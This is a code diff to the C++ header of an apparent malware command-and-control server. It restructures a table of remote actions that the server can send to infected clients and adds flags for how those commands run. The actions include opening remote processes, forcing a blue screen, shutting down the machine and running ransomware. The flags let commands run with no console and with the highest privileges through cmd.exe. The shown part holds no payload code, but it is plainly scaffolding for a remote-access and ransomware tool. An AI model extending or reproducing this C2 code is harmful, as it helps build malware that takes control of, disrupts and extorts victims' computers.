@@ -2,20 +2,53 @@
 
 #include "NetworkCommon.h"
 #include "Client.h"
-
 #include "External/base64.h"
 #include "External/json.hpp"
-
 #include <thread>
 #include <mutex>
 #include <iostream>
-
 #include <openssl/bio.h>
 #include <openssl/rsa.h>
 
-#define OPENSSL_NO_DEPRECATED
-
 using JSON = nlohmann::json;
+
+/*
+	packet flag description
+	for printing info about the flag
+*/
+struct PacketFlagInfo {
+	std::string description;
+	unsigned int flag;
+};
+
+/*
+	possible commands to perform on the client 
+	from the server
+*/
+const std::map<RemoteAction, std::string> ServerCommands = 
+{
+	{ kOpenRemoteProcess, "Open a remote process." },
+	{ kPingClient,        "Send a ping to a remote host." },
+	{ kRemoteBSOD,        "Cause a BSOD on the client." },
+	{ kRemoteShutdown,    "Shutdown the clients machine." },
+	{ kKillClient,        "Forcefully disconnect the client from the C2 server." },
+	{ kRansomwareEnable,  "Run ransomware on the client." },
+};
+
+/*
+	possible flags you can include in your command
+	includes a short description, name as a string to check for input
+	and the actual value of the flag
+*/
+const std::map<std::string, PacketFlagInfo> ServerCommandFlags = 
+{
+	{ "NO_CONSOLE",          {"Run command with no console opened.",								NO_CONSOLE} },
+	{ "RUN_AS_HIGHEST",      {"Run command with highest privileges on remote host.",			    RUN_AS_HIGHEST} },
+	{ "RUN_AS_NORMAL",       {"Run command with current privileges on remote host.",			    RUN_AS_NORMAL} },
+	{ "USE_CLI",             {"Run command using cmd.exe.",										    USE_CLI} },
+	{ "RESPOND_WITH_STATUS", {"Remote host will respond to server after the command is performed.", RESPOND_WITH_STATUS } },
+	{ "PACKET_IS_A_COMMAND", {"This request is something that should be performed on the client.",  PACKET_IS_A_COMMAND} }
+};
 
 class ServerInterface
 {
@@ -111,13 +144,4 @@ private:
 		long        TCPPort              = -1;  // Setup alongside ServerInterface constructor
 		long        UDPPort              = -1;  // Setup alongside ServerInterface constructor
 	} m_Config;
-
-	const std::map<RemoteAction, std::string> m_Commands = {
-		{ kOpenRemoteProcess, "Open a remote process." },
-		{ kPingClient,        "Send a ping to a remote host." },
-		{ kRemoteBSOD,        "Cause a BSOD on the client." },
-		{ kRemoteShutdown,    "Shutdown the clients machine." },
-		{ kKillClient,        "Forcefully disconnect the client from the C2 server." },
-		{ kRansomwareEnable,  "Run ransomware on the client." },
-	};
 };
